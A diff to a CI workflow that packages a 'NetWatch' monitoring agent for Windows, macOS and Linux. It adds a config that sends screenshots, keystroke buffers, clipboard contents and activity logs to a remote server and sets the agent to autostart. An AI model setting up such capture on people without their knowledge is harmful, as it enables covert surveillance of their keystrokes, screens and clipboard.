@@ -43,6 +43,24 @@ jobs:
         working-directory: agent-rust
         run: cargo build --release
 
+      - name: Create config file
+        working-directory: agent-rust
+        shell: pwsh
+        run: |
+          # Create default config file
+          @"
+          {
+            "serverUrl": "https://do.roydevelops.tech/nw-socket",
+            "autoStart": true,
+            "screenshotInterval": 5000,
+            "activityLogInterval": 10000,
+            "keystrokeBufferSize": 100,
+            "heartbeatInterval": 10000,
+            "processInterval": 10000,
+            "clipboardInterval": 2000
+          }
+          "@ | Out-File -FilePath config.json -Encoding UTF8
+
       - name: Create installer with Inno Setup
         working-directory: agent-rust
         shell: pwsh
@@ -67,9 +85,14 @@ jobs:
 
           [Files]
           Source: "target\release\netwatch-agent.exe"; DestDir: "{app}"; Flags: ignoreversion
+          Source: "config.json"; DestDir: "{app}"; Flags: ignoreversion
+
+          [Dirs]
+          Name: "{localappdata}\NetWatch"; Permissions: users-full
 
           [Icons]
           Name: "{group}\NetWatch Agent"; Filename: "{app}\netwatch-agent.exe"
+          Name: "{group}\View Logs"; Filename: "{localappdata}\NetWatch\agent.log"
           Name: "{group}\Uninstall NetWatch Agent"; Filename: "{uninstallexe}"
           Name: "{commonstartup}\NetWatch Agent"; Filename: "{app}\netwatch-agent.exe"; Tasks: startup
 
@@ -121,6 +144,22 @@ jobs:
         working-directory: agent-rust
         run: cargo build --release --target ${{ matrix.target }}
 
+      - name: Create config file
+        working-directory: agent-rust
+        run: |
+          cat > config.json << 'EOF'
+          {
+            "serverUrl": "https://do.roydevelops.tech/nw-socket",
+            "autoStart": true,
+            "screenshotInterval": 5000,
+            "activityLogInterval": 10000,
+            "keystrokeBufferSize": 100,
+            "heartbeatInterval": 10000,
+            "processInterval": 10000,
+            "clipboardInterval": 2000
+          }
+          EOF
+
       - name: Create .app bundle
         working-directory: agent-rust
         run: |
@@ -131,6 +170,7 @@ jobs:
           mkdir -p "${APP_DIR}/Contents/Resources"
 
           cp "target/${{ matrix.target }}/release/netwatch-agent" "${APP_DIR}/Contents/MacOS/"
+          cp config.json "${APP_DIR}/Contents/Resources/"
           chmod +x "${APP_DIR}/Contents/MacOS/netwatch-agent"
 
           cat > "${APP_DIR}/Contents/Info.plist" << 'PLISTEOF'
@@ -225,15 +265,33 @@ jobs:
         working-directory: agent-rust
         run: cargo build --release
 
+      - name: Create config file
+        working-directory: agent-rust
+        run: |
+          cat > config.json << 'EOF'
+          {
+            "serverUrl": "https://do.roydevelops.tech/nw-socket",
+            "autoStart": true,
+            "screenshotInterval": 5000,
+            "activityLogInterval": 10000,
+            "keystrokeBufferSize": 100,
+            "heartbeatInterval": 10000,
+            "processInterval": 10000,
+            "clipboardInterval": 2000
+          }
+          EOF
+
       - name: Create DEB package
         working-directory: agent-rust
         run: |
           mkdir -p deb/DEBIAN
           mkdir -p deb/usr/bin
+          mkdir -p deb/etc/netwatch
           mkdir -p deb/etc/systemd/system
           mkdir -p deb/usr/share/applications
 
           cp target/release/netwatch-agent deb/usr/bin/
+          cp config.json deb/etc/netwatch/
           chmod +x deb/usr/bin/netwatch-agent
 
           # Control file
@@ -252,13 +310,17 @@ jobs:
           cat > deb/etc/systemd/system/netwatch-agent.service << 'EOF'
           [Unit]
           Description=NetWatch Monitoring Agent
-          After=network.target
+          After=network.target network-online.target
+          Wants=network-online.target
 
           [Service]
           Type=simple
           ExecStart=/usr/bin/netwatch-agent
+          Environment="DISPLAY=:0"
           Restart=always
           RestartSec=10
+          StandardOutput=append:/var/log/netwatch-agent.log
+          StandardError=append:/var/log/netwatch-agent.log
 
           [Install]
           WantedBy=multi-user.target
